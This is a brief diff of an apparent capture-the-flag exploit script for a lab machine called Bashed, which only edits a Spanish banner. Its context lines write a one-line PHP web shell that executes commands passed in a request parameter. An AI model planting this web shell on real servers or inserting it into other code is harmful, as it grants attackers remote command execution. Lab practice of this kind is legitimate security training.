@@ -5,7 +5,7 @@ import subprocess
 
 url = 'http://10.10.10.68/dev/phpbash.php'
 
-print("Bienvenido a la consola ROOT de la maquina Bashed\n")
+print("Bienvenido a la consola de la maquina Bashed\n")
 
 print("[+] Creando PAYLOAD...\n")
 subprocess.call("echo '<?php system($_REQUEST[a]); ?>' > rshell.php", shell=True)
